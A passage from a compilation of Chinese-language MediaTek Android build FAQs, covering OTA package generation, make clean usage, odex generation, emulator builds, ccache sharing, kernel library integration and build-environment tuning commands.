sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g device/${COMPANY}/${NEW_PROJECT}/vendorsetup.sh
sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g vendor/mediatek/proprietary/custom/${NEW_PROJECT}/security/efuse/input.xml
sed -i s/${BASE_PROJECT}/${NEW_PROJECT}/g vendor/mediatek/proprietary/custom/${NEW_PROJECT}/Android.mk
```

## [make]  [FAQ02508]  [OTA] 如何编译差分升级包

```text
Two types of OTA update image can be selected. One is full OTA update image and the other is differential OTA update image. The only advantage of differential OTA is the package size of it is smaller than the one of full OTA.

[SOLUTION] 

Need two code bases (V1codebase and V2codebase) to build V1_2 differential OTA update image as following steps:
1. Change directory to root of V1 codebase
2. ./makeMtk $(project)  bm_new
3. ./makeMtk $(project) otapackage
4. Copy out/target/product/$(project)/obj/PACKAGING/target_files_intermediates/<project>_target_files-<user>.zip to the root directory of V2 as V1_org.zip
5. Change directory to root of V2 codebase
6. ./makeMtk $(project)  bm_new
7. ./makeMtk $(project) otapackage
8. Copy out/target/product/$(project)/obj/PACKAGING/target_files_intermediates/<project>_target_files-<user>.zip to the root directory of V2 as V2_org.zip
9. ./build/tools/releasetools/ota_from_target_files –k <key_path> -i V1_org.zip V2_org.zip V1_2.zip

关于key_path的取值。查看 ProjectConfig.mk

如果MTK_SIGNATURE_CUSTOMIZATION=yes并且MTK_INTERNAL=no，
<key_path>的值为：build/target/product/security/[Project] /releasekey

如果MTK_SIGNATURE_CUSTOMIZATION=yes并且MTK_INTERNAL=yes，
<key_path>的值为：build/target/product/security/common/releasekey

如果MTK_SIGNATURE_CUSTOMIZATION=no，<key_path>的值为：build/target/product/security/testkey

另外，可以直接查看make -j24 otapackage的最后部分的打印出来的log，里面包含了签名的路径。
```

## [make]  [FAQ13689]  L版本何时需要make clean操作

```text
L版本make clean何时需要执行，如何执行该命令 
[SOLUTION] 
L版本中，new = clean + remake ，
如果非第一次编译，先做make clean 再做make ，相当于new 整个project,否则就是remake的操作
在涉及到project level的configuration,以及kernel的*_defconfig ，修改后要做clean:

例如： 
device/mediatek/mtxxxx/device.mk ->可以添加一些property,变量,permission等等
device/mediatek/mtxxxx/boardconfig.mk ->宏观的是否支持某个feature
device/$company/ $project/ projectconfig.mk 的修改， 
kernel menuconfig 调整了*_defconfig 文件

make clean 是清除之前编译的可执行文件以及配置文件（例如:  *.o 文件以及可执行文件 ），以及out文件夹
在修改了上面的配置文件后，如果局部编译可能会不起做用，这时，先make clean然后再make，执行命令如下：

source build/envsetup.sh
lunch full_$project-eng/userdebug/user
make clean /-pl/-lk/-kernel

make -j24   或者 make -j24 pl/lk/kernel 重新编译project 或者preloader/lk/kernel

注：除了project level 的configuration ，当需要从PRODUCT_PACKAGES里面删除一个module，也需要make  clean ，或者使用make  -B  module_name,否则无法更新system 下的module
```

## [make]  [FAQ15081]  eng版本make命令生成不了odex的说明

```text
在eng版本上打开宏WITH_DEXPREOPT:=true后，采用make命令生成不了odex文件(预置apk)，而采用mm或mmm命令是可以生成odex文件。
 
[Reason] 
 
Android.mk中定义了LOCAL_MODULE_TAGS := debug导致；
在full build下，如果是透過LOCAL_MODULE_TAGS為debug的方式安裝，在build system中會透過debug_MODULES此變數記錄安裝目錄下的目標，而目標只.apk並沒odex:
out/target/product/cci6735m_65u_nj_l1/system/priv-app/WiFiTest/WiFiTest.apk

然而透過PRODUCT_PACKAGES的方式安裝，比如将LOCAL_MODULE_TAGS改为optional,并在device/mediatek/common/device.mk中增加debug版本WiFiTest apk的安装，在build system中會透過product_FILES此變數記錄安裝目錄下的目標，這時目標除了.apk之外還多了.odex:
out/target/product/cci6735m_65u_nj_l1/system/priv-app/WiFiTest/WiFiTest.apk 
out/target/product/cci6735m_65u_nj_l1/system/priv-app/WiFiTest/arm64/WiFiTest.odex

因此透過debug tag安裝的module只會生成.apk，而透過PRODUCT_PACKAES安裝的才會產生.odex。
此設計與除錯會需要classes.dex關，因此帶debug tag的module才不做odex(因為會把.apk中的classes.dex刪除)。

[SOLUTION] 
所以如果您需要在make 命令全编时产生WiFiTest.apk的odex,您需要将Android.mk中LOCAL_MODULE_TAGS改为：
LOCAL_MODULE_TAGS := optional

并在 device/mediatek/common/device.mk 中将如下设置增加eng时也需要安装此apk.(可以直接去掉判断)

ifeq ($(TARGET_BUILD_VARIANT), eng)
    PRODUCT_PACKAGES += WiFiTest
endif
```

## [make]  [FAQ14830] L版本常见编译问题汇总

```text
目前MOL系统针对build and make的FAQ有很多但过于分散，本FAQ主要针对目前适应L版本（Version >= android 5.0）的已有FAQ进行汇总，同时也汇总了DCC上可以参考的相关文档。 
  
[SOLUTION] 
 
注意以下汇总，适应于L版本：
(1)编译环境搭建
 
android环境搭建请到DCC搜索文档：
Android_Build_Environment_on_Ubuntu_12.04_64-bit_Installation_SOP.docx
 
modem环境搭建请到DCC搜索文档：
MTK_MOLY_MakeBuild_Design_Customer.docx
 
(2)系列FAQs
 
[FAQ14443] 合入patch的注意事项
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ14443
 
[FAQ11888] Turnkey AOSP的软件包的编译命令
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ11888
 
[FAQ14143] AOSP如何快速build kernel、lk 和 preloader
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ14143
 
[FAQ13925] AOSP如何单独build Preloader
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ13925
 
[FAQ13735] AOSP 如何单独build LK
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ13735
 
[FAQ13428] AOSP如何单独build kernel
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ13428
 
[FAQ10625] 提升Android编译速度
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ10625 
 
[FAQ07275] 如何在linux中添加新的kernel module
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ07275
 
[FAQ14175] AOSP如何menuconfig
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ14175
 
[FAQ13609] L版本如何编译android module
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ13609
 
[FAQ13697] L 版本如何将第三方so库打包到apk
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ13697
 
[FAQ13232] L 预置apk
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ13232
 
[FAQ14513] L GMS预置
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ14513
 
[FAQ14131] L版本预编译提取apk的odex文件，如何修改?
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ14131
 
[FAQ13465] L版本How to clone project
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ13465
 
[FAQ13658] L版本上传git服务器后编译出错
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ13658
 
[FAQ11794] Preloader bin size过大编译报错怎么办
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ11794
 
[FAQ14456] system.img>2G导致编译otapackage时报错如何处理
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ14456
 
[FAQ13408] AOSP编译常见问题
http://online.mediatek.inc/Pages/FAQ.aspx?List=SW&FAQID=FAQ13408
```

## [make]  [FAQ10591]  怎样编译MTK的SDK?

```text
请参考 FAQ03042 的编译命令，然后会生成相应的zip包，那只需要将其产生的out目录下的zip包给到三方开发即可，其中public 的api都放在这个zip包中的docs\mediatek-sdk\reference目录下.
```

## [make]  [FAQ03042]  如何编译MTK的模拟器

```text
MTK的emulator是基于MTK平台的codeabse编译得到用来模拟真机的虚拟Device,以下是具体的操作步骤：

1. Build MTK SDK Packages
-对于mt6572以前的chip，用如下的命令编译: 
./makeMtk banyan_addon
-从mt6572开始的chip,由于mt6572之后CPU开始支持X86架构，其performace会更好，mt6572之后，建议编译x86的emulator来使用.
./makeMtk banyan_addon_x86

编译完成后会在out/host/linux-x86/sdk_addon下生成MTK的SDK包，比如mtk_sdk_api_addon-17.1.zip，(其中17是android api level)

2. 解压mtk_sdk_api_addon_17.1.zip
将解压后的mtk_sdk_api_addon-17.1整个文件夹放在android原本的sdk的add-ons目录下。

3. 拷贝emulator相关的执行文件到android sdk tool下：
- 对ICS 4.0之前的版本：
进入android-sdk-windows\add-ons\banyan_addon_ALPS.GB.FDD.MP.V1_eng\tools 目录下，将其中的 emulator.exe 或者 emulator（如果使用Linux的SDK的话）复制出来，覆盖android-sdk-windows\tools下的相应emulator.exe

- 对ICS 4.0及之后的版本：
将mtk_sdk_api_addon-15.1\emulator对应文件夹下的emulator,emulator-arm,emulator-x86这三支文件替换android原本sdk的tools目录下的emulator,emulator-arm,emulator-x86这三支文件(建议备份google原始sdk下的emulator,emulator-arm,emulator-x86，以便后面用到Google emulator)。

4. 创建新的AVD
在Target里面选择带有MediaTek标志的，然后启动这一AVD就可以了
PS：创建AVD时需要同步将SDK的版本升级到相对的android版本，比如JB2对应的android API level 17,则对应SDK的版本也要升级到level 17,否则将在创建AVD的时候将load不出带MediaTek标志的target
```

## [make]  [ota]  [FAQ14456]  system.img>2G导致编译otapackage时报错如何处理

```text
当system分区预置过多apk时如果image size超过2G 在make otapackage时会报如下错误
zipfile.LargeZipFile: Zipfile size would require ZIP64 extensions
或
in writestr zinfo.CRC = crc32(bytes) & 0xffffffff # CRC-32 checksum OverflowError: size does not fit in an int

[SOLUTION] 
这是由于python 2.7 脚本限制
参考/prebuilts/python/linux-x86/2.7.5/lib/python2.7/
ZIP64_LIMIT = (1 << 31) - 1       (31bits相当于2G)

python 3.0+ 已提供solution,  但目前Android 编译环境使用2.x 语法与 3.0不兼容
对此google提供一个workaround solution
参考以下网址有提供详细patch内容
https://android-review.googlesource.com/#/c/142984 


另外还需修改以下脚本  build/tool/releasetools/
1、sign_target_files_apks
2、replace_img_from_target_files.py 
3、ota_from_target_files
4、img_from_target_files.py 
5 、img_from_target_files
6、common.py 
7、add_img_to_target_files
针对所有zipfile.ZipFile  添加最后 allowZip64=True 参数值
ex:
原始文件：
output_zip = zipfile.ZipFile(filename, "a", compression=zipfile.ZIP_DEFLATED) 
修改为：
output_zip = zipfile.ZipFile(filename, "a", compression=zipfile.ZIP_DEFLATED, allowZip64=True)
```

## [make]  [FAQ07293]  如何用jar包代替java代码编译

```text
1. 先完整编译一遍工程（任意eng/user），然后保存要替换java代码的jar包，在alps/out/target/common/obj/JAVA_LIBRARIES/xxx__intermediates目录下的
classes.jar
javalib.jar
 
2. 请将以下文件保存成java_library_prebuilt.mk，并放在alps/build/core/目录下面：
注意：有11处需要tab键开头（make语法对命令需要tab键开头，但网站不支持tab键），请保存成文件后打开编辑，将11处(以下有标志)重新用tab键处理一遍。
##Writen by guangye.yang@mediatek.com
##
LOCAL_SRC_FILES := 
ifdef LOCAL_IS_HOST_MODULE
  $(error $(LOCAL_PATH): Just for target java library)
endif
LOCAL_MODULE_SUFFIX := $(COMMON_JAVA_PACKAGE_SUFFIX)
LOCAL_MODULE_CLASS := JAVA_LIBRARIES
LOCAL_BUILT_MODULE_STEM := javalib.jar
intermediates.COMMON := $(call local-intermediates-dir,COMMON)
full_classes_jar := $(intermediates.COMMON)/classes.jar
common_javalib.jar := $(intermediates.COMMON)/$(LOCAL_BUILT_MODULE_STEM)
LOCAL_INTERMEDIATE_TARGETS += $(full_classes_jar) $(common_javalib.jar)
ifneq (true,$(WITH_DEXPREOPT))
  LOCAL_DEX_PREOPT :=
else
ifeq (,$(TARGET_BUILD_APPS))
ifndef LOCAL_DEX_PREOPT
LOCAL_DEX_PREOPT := true
endif
endif
endif
ifeq (false,$(LOCAL_DEX_PREOPT))
LOCAL_DEX_PREOPT :=
endif
include $(BUILD_SYSTEM)/base_rules.mk
$(cleantarget): PRIVATE_CLEAN_FILES += $(intermediates.COMMON)
$(full_classes_jar) : $(LOCAL_PATH)/classes.jar | $(ACP)
 $(call copy-file-to-target) #注意：这里必须以tab键开头
$(common_javalib.jar) : $(LOCAL_PATH)/$(LOCAL_BUILT_MODULE_STEM) | $(full_classes_jar) $(ACP)
 $(call copy-file-to-target) #注意：这里必须以tab键开头
ifdef LOCAL_DEX_PREOPT
dexpreopt_boot_jar_module := $(filter $(LOCAL_MODULE),$(DEXPREOPT_BOOT_JARS_MODULES))
ifneq ($(dexpreopt_boot_jar_module),)
dexpreopted_boot_jar := $(DEXPREOPT_BOOT_JAR_DIR_FULL_PATH)/$(dexpreopt_boot_jar_module)_nodex.jar
$(LOCAL_BUILT_MODULE) : $(dexpreopted_boot_jar) | $(ACP)
 $(call copy-file-to-target) #注意：这里必须以tab键开头
dexpreopted_boot_odex := $(DEXPREOPT_BOOT_JAR_DIR_FULL_PATH)/$(dexpreopt_boot_jar_module).odex
built_odex := $(basename $(LOCAL_BUILT_MODULE)).odex
$(built_odex) : $(dexpreopted_boot_odex) | $(ACP)
 $(call copy-file-to-target) #注意：这里必须以tab键开头
else
built_odex := $(basename $(LOCAL_BUILT_MODULE)).odex
$(built_odex): PRIVATE_MODULE := $(LOCAL_MODULE)
$(built_odex) : $(DEXPREOPT_BOOT_ODEXS)
$(built_odex) : $(common_javalib.jar) | $(DEXPREOPT) $(DEXOPT)
 @echo "Dexpreopt Jar: $(PRIVATE_MODULE) ($@)" #注意：这里必须以tab键开头
 $(hide) rm -f $@ #注意：这里必须以tab键开头
 @mkdir -p $(dir $@) #注意：这里必须以tab键开头
 $(call dexpreopt-one-file,$<,$@) #注意：这里必须以tab键开头
$(LOCAL_BUILT_MODULE) : $(common_javalib.jar) | $(ACP) $(AAPT)
 $(call copy-file-to-target) #注意：这里必须以tab键开头
ifneq (nostripping,$(LOCAL_DEX_PREOPT))
 $(call dexpreopt-remove-classes.dex,$@) #注意：这里必须以tab键开头
endif
endif
else
$(LOCAL_BUILT_MODULE) : $(common_javalib.jar) | $(ACP)
 $(call copy-file-to-target) #注意：这里必须以tab键开头
endif
 
3. 在alps/build/core/config.mk里添加：
BUILD_JAVA_LIBRARY_PREBUILT:= $(BUILD_SYSTEM)/java_library_prebuilt.mk
 
4. 删除对应的java代码及对应的Android.mk，然后在当前目录创建新的Android.mk，并复制第1步备份的2只文件到Android.mk旁边(注意，文件名不能修改，否则无法识别!!!)，新的Android.mk编写如下：
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE := services
LOCAL_MODULE_PATH := $(TARGET_OUT_JAVA_LIBRARIES)
include $(BUILD_JAVA_LIBRARY_PREBUILT)
 
5. 重新完整的编译工程(任意eng/user)，下载查看效果
 
6. 重要提示，由于第1步保存的classes.jar是没有经过proguard，流出去很容易被反编译，请自行做proguard，但是请不要把接口proguard，否则编译失败！
```

## [make]  [FAQ11348]  共享ccache的缓存

```text
1. android自带的ccache版本(2.4版本)过低，是无法支持以上的功能的，需要使用新版ccache。
2. 最新的ccache请到http://ccache.samba.org/download.html下载
3. 下载解压之后，在linux底下进入ccache目录，运行:
  ./configure
  ./make
  ./strip --strip-all ccache
4. 之后就可以在ccache目录下看到ccache文件，拿这个文件替换掉codebase里的alps/prebuilts/misc/linux-x86/ccache/ccache文件。
5. 请重复执行第4步将所有codebase的ccache替换掉（保证所有使用ccache缓存的ccache都是最新版本，因为不同版本的ccache生成的缓存无法共享！）
6. 所有需要共享的用户请添加以下环境变量：
  export CCACHE_DIR=<ccache缓存路径>
  export CACHE_UMASK=002
  unset CCACHE_HARDLINK
  可以将以上添加到$HOME/.bashrc，保证打开的终端都已经加载以上的环境变量。其中<ccache缓存路径>请替换为指定的绝对路径(必须是需要共享的用户都能读写的)。比如：/proj/.ccache
  注意：由于多人同时写ccache缓存可能引起IO带宽不够反而降低效率，强烈建议服务器编译可以按第6步配置，但是其他共享用户最好在第6步的基础上增加export CCACHE_READONLY=1仅只读缓存内容。
7. 设置好第6步后，重新登入终端使环境变量生效，然后创建<ccache缓存路径>，设置<ccache缓存路径>的共享权限，在终端输入：find $CCACHE_DIR -type d | xargs chmod g+s
8. 完成前面的步骤后，就可以开始共享使用了，注意ccache空间要足够大，否则反而拉长编译时间。如果遇到问题可以参考ccache的使用说明：http://ccache.samba.org/manual.html


Android Q ccache
https://sx.ix5.org/info/post/android-q-changes/
ccache is no longer supported by default, the prebuilt ccache exec has been removed.

See build/core/ccache.mk:

We no longer provide a ccache prebuilt.

Ours was old, and had a number of issues that triggered non-reproducible results and other failures. Newer ccache versions may fix some of those issues, but at the large scale of our build servers, we weren’t seeing significant performance gains from using ccache – you end up needing very good locality and/or very large caches if you’re building many different configurations.

Local no-change full rebuilds were showing better results, but why not just use incremental builds at that point?

So if you still want to use ccache, continue setting USE_CCACHE, but also set the CCACHE_EXEC environment variable to the path to your ccache executable.

Install ccache and set export CCACHE_EXEC=/usr/bin/ccache in your ~/.bashrc.

Android Q上已经默认不支持ccache了，因为可能会有很多无法复现和无法预见的问题，如果需要打开 ccache 需要自己添加 PATH

export CCACHE_EXEC=/usr/bin/ccache 
TODO : 为什么 export 了之后没用？
```

## [CMD]  [make] MTK android平台常用的编译调试命令

```text
https://utxz.com/2018/01/10/mtk_android002/

1 配置编译环境
1) 自用环境配置脚本myenv.sh

# {board} {project} 变量根据不同项目定义
export USE_CCACHE=1
export CCACHE_DIR=/opt/.ccache_{board}_{project}
#export _JAVA_OPTIONS=-Xmx3072m

export JACK_SERVER_VM_ARGUMENTS="-Dfile.encoding=UTF-8 -XX:+TieredCompilation -Xmx4g"
#./prebuilts/sdk/tools/jack-admin kill-server
#./prebuilts/sdk/tools/jack-admin start-server

#export JAVA_HOME=/usr/lib/jvm/java-1.8.0-openjdk-amd64
#export JRE_HOME=/usr/lib/jvm/java-1.8.0-openjdk-amd64/jre
#export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH
#export PATH=$JAVA_HOME/bin:$PATH

prebuilts/misc/linux-x86/ccache/ccache -M 50G
source build/envsetup.sh
lunch 22
2) 导出环境变量

# . myenv.sh
2 内核配置修改(具体平台可能有差异)
kernel-3.18/arch/arm64/configs/{board}_debug_defconfig   // eng模式
kernel-3.18/arch/arm64/configs/{board}_defconfig         // user模式
cd git/kernel-3.18
cp arch/arm64/configs/{board}_debug_defconfig .config
make ARCH=arm64 menuconfig
make ARCH=arm64 savedefconfig
cp defconfig arch/arm64/configs/{board}_debug_defconfig
# 执行后会有一些中间文件产生，可手动删除。

# 另外一种推荐方法:
menuconfig命令：
source build/envsetup.sh && lunch (一个shell执行一次即可)
mmm kernel-3.18:kernel-menuconfig (生成的.cconfig在out\target\product\[project] \obj\KERNEL_OBJ)
mmm kernel-3.18: kernel-savedefconfig (用out\target\product\[project] \obj\KERNEL_OBJ\.config 替换 kernel-3.18/arch/$(TARGET_ARCH)/configs/[project] _defconfig)
3 编译指定模块
make pl -j8             // 编译preloader
make lk -j8             // 编译bootloader
make bootimage -j8      // 编译kernel
make systemimage -j8    // 编译system
make recoveryimage -j8  // 编译recovery

#其他编译modules，有nodeps表示不依赖检查，编译较快

make ramdisk-nodeps     // 打包ramdisk
make bootimage-nodeps   //

平台之间命令有差异，可以自己查看android/build/core/main.mk或其他makefile里的规则
dont_bother_goals := clean clobber dataclean installclean \
 help out \
 snod systemimage-nodeps \
 stnod systemtarball-nodeps \
 userdataimage-nodeps userdatatarball-nodeps \
 cacheimage-nodeps \
 vendorimage-nodeps \
 ramdisk-nodeps \
 bootimage-nodeps \
 recoveryimage-nodeps \
 product-graph dump-products

# mmm的编译方式
# 编译命令：(-B、-j是可选项，-B表示强制编译，-j表示开的线程数，进行快速编译)
mmm ../kernel-3.18:bootimage          // mmm方式编译内核bootimage
mmm -B kernel-3.18:kernel -j8         // mmm方式编译内核
mmm -B vendor/mediatek/proprietary/bootable/bootloader/preloader:pl -j8
mmm -B vendor/mediatek/proprietary/bootable/bootloader/lk:lk -j8

# clean命令：
mmm vendor/mediatek/proprietary/bootable/bootloader/preloader:clean-preloder
mmm vendor/mediatek/proprietary/bootable/bootloader/lk:clean-lk
mmm kernel-3.18:clean-kernel
4 git仓库kernel单独编译方式：
1. 修改android/device/mediatek/common/device.mk文件，注释掉
#PRODUCT_COPY_FILES += $(LOCAL_KERNEL):kernel
5 内核烧录
注意adb的环境变量，有时候使用android env下的adb不能成功，用ubuntu自带的adb又是可以的
可能是ubutnu环境有问题
adb path/to/boot.img /dev/block/platform/mtk-msdc.0/11230000.MSDC0/by-name/boot
或者拷贝到/data分区使用dd

ls /dev/block/platform/mtk-msdc.0/11230000.MSDC0/by-name/boot -l
/dev/block/platform/mtk-msdc.0/11230000.MSDC0/by-name/boot -> /dev/block/mmcblk0p10
adb path/to/boot.img /dev/block/mmcblk0p10
```

## [make]  [FAQ05353] 如何添加第三方lib库到kernel中

```text
注意：只能将lib库放在kernel编译到的地方，如下：
alps/kernel/
alps/mediatek/custom/common/kernel/
alps/mediatek/custom/$platform/kernel/
alps/mediatek/custom/$proj/kernel/
alps/mediatek/kernel/
alps/mediatek/platform/$platform/kernel/core/
alps/mediatek/platform/$platform/kernel/drivers/
假设第3方库名称为test.a
(1). 如果存放的目录存在Makefile，那么只需在该Makefile最后添加：
    obj-y += test.a
    然后将test.a文件复制到该目录下，
    重新命名为test.a_shipped，目的是防止clean kernel阶段把该库给清除掉！
    重新编译kernel即可。
(2). 如果存放的目录不存在Makefile，比如在alps/mediatek/custom/目录下的kernel目录都没有Makefile，这时需要自行添加一个Makefile，内容和第1种方法差不多：
    obj-y := xxx.o yyy.o test.a
    以上表示将xxx.c/yyy.c和test.a编译到kernel
    然后将test.a文件复制到该目录下并重新命名为test.a_shipped
    重新编译kernel即可。
注意：alps/mediatek/custom/common/kernel/touchpanel/xxx目录下的文件会和alps/mediatek/custom/common/kernel/touchpanel/src目录合并，obj-y要将两个目录下的obj全部加入才行，否则编译失败。也可以用以下Makefile，自动将所有obj加入obj-y，省却麻烦。其他目录如有类似的情形一样处理。
    添加的Makefile(将所有*.c变为*.o并加入obj-y)：
    include $(MTK_PATH_BUILD)/common.mk
    path := $(if $(filter yes,$(KBUILD_OUTPUT_SUPPORT)),$(srctree)/$(obj),$(obj))
    obj-y := $(patsubst %.c,%.o,$(subst $(path)/,,$(call wildcard2,$(path)/*.c)))
    obj-y += test.a
 
说明：对于kernel的Makefile编写规则说明，可以到网络搜索相关材料参考，比如obj-y表示要编译到kernel，而obj-m表示要编译成module，obj-n或obj-表示不编译
```

## [make]  [FAQ07632] 如何在编译的时候，控制删除apk不用的资源?

```text
1. 修改alps/meidatek/config/xxx/ProjectConfig.mk下的MTK_PRODUCT_LOCALS，去掉不用的资源，比如屏幕密度或语言等.
2. nodpi和mipmap的相关resource因其特殊作用会被保留

PS:
nodpi: resource不会根据device density做scaling
mipmap:提供与device dpi不同的resource
```

## [make]  [FAQ08222]  一个干净的Codebase，在没有new的前提下，如何单独编译某个Android模块?

```text
可以用这个命令: ./makeMtk <project> r dr <module_name>
使用前提：module_name必须为带有Android.mk的Android模块，不能是preloader/lk/kernel/ko
```

## [debug]  [make]  [FAQ03781]  如何分析编译到某个阶段卡死的问题

```text
可能的原因：
1. 修改或添加编译代码导致
2. 编译环境没按SOP安装
3. 其他软件引起冲突

分析方法：
1. 首先修改为单线程编译(-j1)
    1)MTK代码编译为多线程编译(加快编译速度，但是增加系统负担，增加memory消耗)
    2)在mediatek/build/makemtk.mk里
        CPUCORES := $(shell cat /proc/cpuinfo|grep processor|wc -l)
        MAKEJOBS := -j$(CPUCORES)
        修改为
        MAKEJOBS := -j1
2. 然后在编译卡死时用ps -u查看编译进程，看卡死在哪个进程
```

## [make]  [FAQ03782]  如何添加一个apk使模拟器和真机都编译进去

```text
1. 编译模拟器时，会将以下文件中的PRODUCT_PACKAGES定义的apk都编译进去
build/target/product/banyan_addon.mk
build/target/product/sdk.mk
sdk/build/product_sdk.mk
development/build/product_sdk.mk
build/target/product/core.mk

2. 编译真机版本是，会将以下文件中的PRODUCT_PACKAGES定义的apk都编译进去
build/target/product/$project.mk
build/target/product/common.mk
build/target/product/telephony.mk
build/target/product/core.mk

所以如果想添加一个apk使模拟器和真机都编译进去的话，就必须添加到core.mk（模拟器和真机都会包含）
```

## [make]  [FAQ03719]  如何修改apk版本号(格式类似为4.0.4-eng.root.1235877699)

```text
在apk中显示类似版本号+编译信息(比如4.0.4-eng.xiaoming.1235877699)，该信息会将你当时编译的用户名一起放进去了(比如前面的信息里的用户名为xiaoming), 最后一串数字是编译时间(以秒为单位)
 
[KEYWORD] 
apk
版本号
aapt
 
[SOLUTION] 
这个显示的来源是apk里的AndroidManifest.xml里的versionName, 但是该字段在编译前的AndroidManifest.xml没有，只有在apk里的AndroidManifest.xml才有。
对比AndroidManifest.xml编译前后的状况
 
这个变化是在打包apk时添加的，在build/core/definitions.mk里的create-resource-java-files和add-assets-to-package用aapt打包时有传--version-name的参数导致
define create-resource-java-files
$(hide) $(AAPT) package $(PRIVATE_AAPT_FLAGS) -m \
    ......
    $(if $(filter --version-code,$(PRIVATE_AAPT_FLAGS)),,$(addprefix --version-code , $(PLATFORM_SDK_VERSION))) \
    $(if $(filter --version-name,$(PRIVATE_AAPT_FLAGS)),,$(addprefix --version-name , $(PLATFORM_VERSION)-$(BUILD_NUMBER))) \
    ......
endef
define add-assets-to-package
$(hide) $(AAPT) package -u $(PRIVATE_AAPT_FLAGS) \
    ......
    $(if $(filter --version-code,$(PRIVATE_AAPT_FLAGS)),,$(addprefix --version-code , $(PLATFORM_SDK_VERSION))) \
    $(if $(filter --version-name,$(PRIVATE_AAPT_FLAGS)),,$(addprefix --version-name , $(PLATFORM_VERSION)-$(BUILD_NUMBER))) \
    ......
endef
 
如果需要修改，则可以直接修改$(PLATFORM_VERSION)-$(BUILD_NUMBER)即可
```

## [make]  [FAQ02509]  [ota] 如何编译带logo的OTA升级包

```text
Change directory to the root of code base
./mk <project> bm_new
./mk <project> otapackage
./build/tools/releasetools/ota_form_target_files -k build\target\product\security\common\releasekey  -l out/target/product/<project>/logo.bin out/target/product/<project>/obj/PACKAGING/target_files_intermediates/<project>-target_files-<mode>.<user_id>.zip update.zip
```

## [make]  [FAQ02507]  [ota] 如何编译完整升级包

```text
Find the steps as the following:
Change directory to the root of code base
./makeMtk <project>bm_new
./makeMtk <project> otapackage
Copy out/target/product/<project>/<project>-ota-<mode>.<user_id>.zip to root directory of SD card and rename it to update.zip
The full OTA package size is about equal to boot.img size + system.img size.
```

## [make]  [FAQ03561]  编译vm-tests-tf出现Too many open files

```text
出错的log中有一句：
Caused by: java.io.FileNotFoundException: cts/tools/vm-tests-tf/src/dot/junit/opcodes/iget_char/Test_iget_char.java (Too many open files)

[KEYWORD] 
java.io.FileNotFoundException
Too many open files
vm-tests-tf

[SOLUTION] 
这是由于linux限制了一次会话中，程序最大同时打开文件数目(default:1024, MTK:65535)
 
详细分析：
在linux下跑一个多线程读取文件的程序，待读取文件有数十万个。程序读取过程中抛出如下异常*****(Too many open files)。

原因是由于linux限制了一次会话中，程序最大同时打开文件数目。在redhat5中，该数值为1024。可以使用ulimit -n 验证。

解决办法
1、临时修改该数值，可使用
ulimit -n XXXX
ulimit -n XXXX

2、永久修改
2.1. 查看当前设置
ulimit -n
(默认是1024，MTK是65535)

2.2. 查看系统可接受的最大打开文件数(一般默认已足够，不用修改)
# cat /proc/sys/fs/file-max
（默认可能是372998，已足够）如果小于你期望的值，可以改大：

# echo 327998 > /proc/sys/fs/file-max
或者写入 /etc/sysctl.conf中，以便重启也能生效：
fs.file-max = 327998

2.3. 修改/etc/security/limits.conf文件，设置用户最大打开文件数
#<domain>      <type> <item>         <value>
* - nofile 2048    (添加这一行)

这样即设置系统每个用户的最大打开文件数为2048。

注意 nofile 参数在 type 类型上有2个可能的选项：hard 和 soft ，这两个值都需要设置，“-”代表同时设置这2个值为后面的数字。

hard limit 只是作为 soft limit 的上限，soft limit 才是你设置的系统当前限制。当你设置 hard limit 后，你以后设置的 soft limit 的值就只能小于 hard limit 。普通用户可以降低 hard limit 的值，但是不能提高它，只有 root 用户才能提高 hard limit。

2.4. 退出shell登陆，重新登陆一次即生效(运行ulimit -n 检查)

已经启动的进程，可能需要关闭后重新启动才生效
```

## [make]  [FAQ05995]  如何把自己的代码包或开源项目的code, 编译进android

```text
1.需要加入的是native 程序，即编译成elf 可执行文件，
或是共享库.so，或是lib库.a文件，建议将代码包放在alps\external 下面, 并编写相应的Android.mk 文件，

2.需要加入的是APK 程序或是JAVA lib库.jar文件,建议请将代码包放在alps\packages\apps下面，并编写相应的Android.mk 文件，

3.如何编写Android.mk
请搜索dcc 上文档 How_to_Write_an_Android.mk.pptx && Android_Build_System_for_customer_4.1.pptx  from page 56

4.build 系统在当前路径找到Android.mk 后，就不会在其子目录下搜索Android.mk文件，所以如果
代码包里面还有文件夹，需要include里面的Android.mk 进来
则要在代码包这级目录下的Android.mk 里面调用 include $(call all-makefiles-under,$(LOCAL_PATH)) 

5．Android.mk写完之后，还要将Android.mk 中的LOCAL_MODUEL=xxx，或LOCAL_PACKAGE_NAME=xxx

添加在在PRODUCT_PACKAGES后面：
PRODUCT_PACKAGES += xxx

这样系统在能编译到。

5.1. 编译模拟器时，会将以下文件中的PRODUCT_PACKAGES定义的都编译进去
build/target/product/banyan_addon.mk
build/target/product/sdk.mk
sdk/build/product_sdk.mk
development/build/product_sdk.mk
build/target/product/core.mk

5.2. 编译真机版本是，会将以下文件中的PRODUCT_PACKAGES定义的都编译进去
build/target/product/$project.mk
build/target/product/common.mk
